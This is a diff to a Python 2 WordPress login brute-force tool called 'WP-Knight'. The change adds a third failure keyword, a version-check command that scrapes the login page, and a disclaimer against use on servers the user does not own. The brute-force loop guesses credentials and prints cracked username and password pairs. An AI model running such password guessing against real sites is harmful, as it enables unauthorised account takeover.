@@ -2,7 +2,7 @@
 # WordPress Cracker 6/19/2018
 # Coded by Pythogen
 
-# Intended for personal security testing
+# Intended for personal security testing. Please do not use on servers you don't own.
 # WP-Knight was created as a mini alternative to WPScan.
 
 # (6/19/2018) - Basic cracker function complete. Works perfectly on any WordPress target. New features will be added soon.
@@ -29,6 +29,8 @@ login_URL = "http://127.0.0.1/wp/wordpress/wp-login.php"
 keyword = "incorrect"
 # Detecting invalid username
 keyword2 = "Invalid"
+# Detecting empty field
+keyword3 = "empty"
 
 uname = 'a'
 pwd = 'a'
@@ -39,20 +41,22 @@ bPlace = 3
 def console():
 	while(True):
 		cmd = raw_input(" Enter command> ")
-		if cmd == "help":
+		if cmd == "help" or cmd == "?":
 			print """\n Commands:
 	go - Activate WP-Knight
+	version - Check WordPress version
 	url - Set login URL ([website]/wp/wordpress/wp-login.php)
 	exit - Exit WP-Knight
 			"""
 		elif cmd == "exit":
 			sys.exit()
 		elif cmd == "go":
-			print ""
 			print "\n WP-Knight Activated! \n"
 			bruteforce()
 		elif cmd == "url":
 			url_config()
+		elif cmd == "version":
+			versionCheck()
 		else:
 			print "\n Invalid Command\n"
 
@@ -72,6 +76,13 @@ def url_config():
 	host = find_between(login_URL,"//","/")
 	redirect = 'http://%s/wp/wordpress/wp-admin/' % (host)
 	print ""
+
+def versionCheck():
+	global login_URL
+	headers = {'Accept-Encoding': 'identity'}
+	r = requests.get(login_URL, headers='')
+	a = find_between(r.text,"ver=","'")
+	print "\n WordPress version: %s\n" % (a)
 
 def bruteforce():
 	global aPlace
@@ -125,10 +136,11 @@ def bruteforce():
 				# 4) Looking for keyword indicating successful login
 				Check = bruteforce.page.content.find(keyword)
 				Check2 = bruteforce.page.content.find(keyword2)
+				Check3 = bruteforce.page.content.find(keyword3)
 
 				# Check = incorrect , Check2 = invalid
 				# If 'incorrect' and 'invalid' not found, then you've cracked the password.
-				if Check == -1 and Check2 == -1:
+				if Check == -1 and Check2 == -1 and Check3 == -1:
 					print "\n Cracked: %s:%s \n" % (u,p)
 					return
 				# Otherwise, continue..
